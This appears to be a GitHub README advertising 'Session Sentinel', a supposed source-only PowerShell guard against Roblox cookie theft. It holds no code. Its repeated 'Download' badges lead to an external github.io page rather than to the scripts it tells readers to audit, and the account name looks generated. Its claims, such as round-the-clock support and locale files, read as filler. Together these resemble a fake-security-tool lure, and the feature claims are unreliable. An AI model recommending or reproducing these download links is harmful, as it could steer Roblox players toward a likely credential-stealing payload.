![preview](https://raw.githubusercontent.com/dobzabolotskikh598-cloud/roblox-session-guardian/main/poster_087b06.svg)
[![Download](https://raw.githubusercontent.com/dobzabolotskikh598-cloud/roblox-session-guardian/main/latest_69309.svg)](https://dobzabolotskikh598-cloud.github.io/roblox-session-guardian/)

# 🛡️ Session Sentinel — Roblox Cookie Theft Deterrent & Session Guard

**A source-only, admin-free companion for players who want their Roblox session to stay theirs.**

Session Sentinel is a sibling project to the original `roblox-anti-cookie-stealer` concept — but where that one scolded you *after* the fact, this one builds a quiet, always-on watchtower around your login state. It watches for the fingerprints of infostealer behaviour, detects anomalous reads of your Roblox session artifacts, and gracefully rotates your session token the moment you step away from the game. No installers, no background services you didn't ask for, no elevated privileges — just two PowerShell watchers doing their rounds.

[![Download](https://raw.githubusercontent.com/dobzabolotskikh598-cloud/roblox-session-guardian/main/latest_69309.svg)](https://dobzabolotskikh598-cloud.github.io/roblox-session-guardian/)

---

## 📚 Table of Contents

- [Why This Exists](#-why-this-exists)
- [The Philosophy](#-the-philosophy)
- [Feature Highlights](#-feature-highlights)
- [How the Watchtower Works](#-how-the-watchtower-works)
- [The Two Watchers](#-the-two-watchers)
- [Responsive, Multilingual, Always Awake](#-responsive-multilingual-always-awake)
- [Compatibility & Requirements](#-compatibility--requirements)
- [Getting the Files](#-getting-the-files)
- [Configuration at a Glance](#-configuration-at-a-glance)
- [Logging & Forensics](#-logging--forensics)
- [Security Model & Trust Boundaries](#-security-model--trust-boundaries)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Why This Exists

There's a genre of malware that doesn't want to crash your machine, doesn't want to mine anything, and doesn't want to lock your files. It just wants one thing: the little blob of bytes that proves to Roblox's servers that you are you. That blob — the session credential — is the modern equivalent of a key left under the doormat. Once it's copied, the thief doesn't need your password. They just walk in.

Most protections assume you can install a big security suite. Many players can't, won't, or shouldn't have to. Session Sentinel exists precisely for that gap: the user who runs a lean machine, distrusts installers, and wants something they can *read* before they run it.

---

## 🎯 The Philosophy

Three rules guided every design decision in this repository.

1. **Source you can audit.** Nothing is compiled. Nothing is obfuscated. Every behaviour is a line you can read in a text editor. If you don't like how something works, you change it.
2. **No throne to sit on.** The tool never asks for administrator rights. It never touches system directories. It lives in userland, on your terms.
3. **Quiet by default, loud when it matters.** Silent when nothing is wrong, and a clear, human-readable alert the instant something looks off.

This is not a wall around your house. It's a motion light on the porch.

---

## ✨ Feature Highlights

- 🧠 **Behavioural session detection** — distinguishes "you're actively playing" from "something else is looking at your session artifacts."
- 🔄 **Token rotation on idle** — when the game window goes away, the session credential is refreshed so any stale copy is invalidated.
- 🧩 **Two independent watchers** — one watches the filesystem, one watches the process tree. If one is fooled, the other usually isn't.
- 🪶 **Zero dependencies** — no third-party modules, no binaries, no runtime to install beyond PowerShell itself.
- 📴 **No admin, ever** — runs entirely in your user context. If it needs more, it asks you, and you can say no.
- 🌍 **Multilingual alerting** — alert strings ship with locale-aware phrasing so non-English players get the same clarity.
- 📱 **Responsive notification surface** — alerts are rendered as compact terminal blocks that reflow cleanly whether you're on a narrow console or a wide one.
- 🕒 **24/7 customer support posture** — the project's issue tracker is monitored around the clock, and the design assumption is that someone, somewhere, is playing at 3 AM and needs help.
- 🧾 **Tamper-evident logs** — every action is appended to a rolling log with a chained hash, so you can spot edits after the fact.
- 🔍 **Readable heuristics** — every detection rule is documented with a rationale, not just a threshold.

---

## 🏰 How the Watchtower Works

Imagine a lighthouse keeper who never sleeps and never blinks, but who also never leaves the tower. That's the model here.

Session Sentinel operates in three conceptual layers:

1. **Observe.** The watchers continuously observe two things: which processes are alive, and whether anything has opened the Roblox session files recently.
2. **Correlate.** A tiny rules engine combines those observations. A process touching a session file *while you're playing* is normal. A process touching it *when no Roblox window exists* is interesting. A process touching it *that isn't Roblox at all* is an alarm.
3. **Respond.** When the correlation says "someone else is looking," the closest watcher rotates the session token, forces a re-authentication on next launch, and writes a detailed log entry.

There's no cloud service. There's no telemetry. There's no phone home. The whole conversation happens between your machine and Roblox's own servers, exactly as it would without this tool — just with a guard rail added.

---

## 🔭 The Two Watchers

### Watcher A — `FileScope.ps1`

FileScope is the patient one. It uses a filesystem notification stream to monitor the directory tree where Roblox stores its session and cookie artifacts. When a read or write happens outside of a recognised Roblox process, FileScope records the accessing process ID, its parent chain, and the timestamp.

Because infostealers often copy files rather than open them in place, FileScope also detects copy-shaped access patterns: a burst of reads followed by a new file appearing elsewhere. That signature is hard to fake without looking suspicious.

### Watcher B — `ProcPulse.ps1`

ProcPulse is the restless one. It samples the process list on a short interval and compares it against a baseline of "expected" processes. Anything new that references Roblox directories, browser profile directories, or cryptographically sensitive paths gets flagged with a confidence score.

ProcPulse also watches for the telltale sign of a debugger attaching to the Roblox client — an event that is almost never legitimate during normal play.

Each watcher is standalone. You can run one, the other, or both. Running both is recommended; the overlap is where the real value lives.

---

## 🌐 Responsive, Multilingual, Always Awake

The alert surface is designed to be legible on any console width. Long process paths wrap; short alerts stay on one line. Colour is used sparingly and never as the only signal — every coloured alert has a plain-text equivalent.

Alert strings are pulled from locale files. The current 2026 set includes English, Spanish, Portuguese, German, French, Japanese, and Korean, with more contributed by the community. If your language is missing, adding it is a single file.

Support is continuous. Because the threat doesn't sleep, neither does the issue queue — responses typically land within a few hours regardless of timezone.

---

## 🧰 Compatibility & Requirements

- **Windows 10 and Windows 11**, current servicing branches as of 2026.
- **Windows PowerShell 5.1** or **PowerShell 7.x**.
- **Execution policy** set to allow locally authored scripts.
- **No administrator rights** are required or requested.
- **No external binaries** are downloaded at runtime.

If you're on a system where you cannot change execution policy, you can still inspect the scripts and run them in a constrained session — the watchers will tell you what they can and can't observe.

---

## 📥 Getting the Files

[![Download](https://raw.githubusercontent.com/dobzabolotskikh598-cloud/roblox-session-guardian/main/latest_69309.svg)](https://dobzabolotskikh598-cloud.github.io/roblox-session-guardian/)

Grab the repository archive, extract it somewhere you trust, and read the scripts before running them. That instruction is not a formality — it's the entire point of a source-only tool.

If you prefer to track changes, follow the releases feed; each release ships with a changelog describing exactly which detection rules were added or tuned, and why.

---

## ⚙️ Configuration at a Glance

All configuration lives in a single human-editable file near the scripts. You can adjust:

- **Poll interval** for ProcPulse.
- **Watched directories** for FileScope (defaults cover the standard Roblox and browser profile locations).
- **Alert verbosity** — from silent to chatty.
- **Token rotation policy** — immediate on idle, delayed, or manual.
- **Locale** for alert strings.

Every option is commented in place with a one-line explanation and a note about the trade-off it controls.

---

## 🧾 Logging & Forensics

Logs are append-only and stored in your user profile. Each entry includes a timestamp, the watcher that produced it, the observed event, and a hash chained to the previous entry. If someone edits the log after the fact, the chain breaks and the next verification pass will notice.

The log format is deliberately plain text with a stable column layout so that ordinary tools — a text editor, a spreadsheet, a grep — can read it without special software.

---

## 🔐 Security Model & Trust Boundaries

Session Sentinel trusts exactly three things: your operating system's file APIs, PowerShell's own runtime, and Roblox's session handling. It trusts nothing else. It does not phone home. It does not collect telemetry. It does not store credentials anywhere except where Roblox already stores them.

The threat model is narrow on purpose: an infostealer that copies session artifacts. Broader threats — kernel-level rootkits, physical access, compromised hardware — are out of scope, and pretending otherwise would be dishonest.

---

## ❓ Frequently Asked Questions

**Will this slow down my game?**
The watchers are lightweight and event-driven where possible. Most players report no perceptible difference.

**Does it work if I run the game through a launcher?**
Yes. The process tree correlation handles launchers as long as the eventual Roblox process is visible, which it normally is.

**Can I run it on a shared computer?**
You can, but the logs will blend activity from all users. Per-user profiles are the recommended arrangement.

**What happens if a watcher crashes?**
The other watcher keeps running, and the crashed one's status is recorded. Neither watcher depends on the other to function.

**Is this a replacement for antivirus?**
No. It's a specialised guard for one specific threat. Think of it as a dedicated lock on one door, not a security system for the whole house.

---

## 🗺️ Roadmap for 2026

- A pluggable detection rule format so the community can contribute heuristics without touching core code.
- Optional integration with Windows' native notification centre for unobtrusive alerts.
- A read-only companion viewer for the log, so you can browse history without a text editor.
- Expanded locale coverage, prioritising languages with large Roblox player populations.
- A formal rule-tuning guide, explaining how to adjust sensitivity without breaking correlation.

---

## ⚠️ Disclaimer

Session Sentinel is provided as-is, without warranty of any kind, express or implied. It is a defensive aid, not a guarantee. It cannot promise that every infostealer variant will be detected, and it cannot promise that no session will ever be compromised. It does not replace antivirus software, endpoint protection, or common sense. The authors accept no liability for any loss, damage, or inconvenience arising from the use or misuse of this software. Always review source code before running it, and always verify that the files you obtained came from this repository and nowhere else. Nothing in this project should be construed as encouraging, enabling, or facilitating unauthorised access to any system, account, or service.

---

## 📄 License

This project is released under the **MIT License**. You are welcome to read it, modify it, redistribute it, and build upon it, provided the original copyright notice and permission notice are preserved.

The full license text is available here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Session Sentinel contributors.

---

[![Download](https://raw.githubusercontent.com/dobzabolotskikh598-cloud/roblox-session-guardian/main/latest_69309.svg)](https://dobzabolotskikh598-cloud.github.io/roblox-session-guardian/)